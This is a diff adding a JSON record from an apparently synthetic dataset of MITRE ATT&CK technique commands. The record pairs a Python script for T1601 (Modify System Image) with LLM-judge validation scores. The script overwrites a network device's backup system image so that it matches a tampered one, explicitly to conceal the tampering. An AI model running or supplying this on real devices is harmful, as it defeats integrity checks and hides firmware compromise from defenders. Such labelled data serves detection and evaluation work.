@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Python",
+  "command": "python3 - <<'PY'\nimport os, sys, shutil, filecmp\nif os.geteuid() != 0:\n    sys.exit(\"root required\")\n\ncurrent = \"/boot/flash/system.img\"\nbackup = \"/boot/backup/system.img.bak\"\n\nos.makedirs(os.path.dirname(backup), exist_ok=True)\nif not os.path.exists(backup) or not filecmp.cmp(current, backup, shallow=False):\n    shutil.copy2(current, backup)\n    assert filecmp.cmp(current, backup, shallow=False)\n    print(\"Synchronized backup to match current system image\")\nelse:\n    print(\"Backup already matches current image\")\nPY",
+  "explanation": "Ensures the backup image mirrors the currently modified system image, masking unauthorized changes by updating the backup copy.",
+  "rationale_steps": [
+    "Require root to read/write boot and backup locations.",
+    "Compare the active image with the backup using filecmp.",
+    "If different, overwrite the backup and verify equality to conceal the tampering."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1601-0c03443f-2dfd4a7b",
+  "source_prompt_hash": "0c03443f",
+  "timestamp_utc": "2025-09-30T04:56:19.919567Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The here-doc is properly delimited and the Python snippet is valid, balanced, and runnable via 'python3 -'.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly synchronizes a backup to match the current image, it does not modify the system image or bootloader as required by T1601 and also requires root despite the 'Privilege: None' claim.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:20:25.925549Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python heredoc is perfectly well-formed with balanced quotes, proper imports, valid os/shutil/filecmp API usage, and correct indentation throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the described technique of overwriting the backup image with the currently modified system image, effectively masking unauthorized firmware changes by ensuring integrity checks against the backup would pass, which directly aligns with T1601 defense evasion via system image tampering.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T01:22:43.869501Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses a perfectly formed shell heredoc to execute a Python script with correct syntax, balanced quotes, and proper logic.",
+        "semantic_score": 5,
+        "semantic_justification": "The script accurately implements a sub-action of T1601 by overwriting a backup system image to match a modified production image, effectively masking unauthorized changes.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:22:46.678550Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
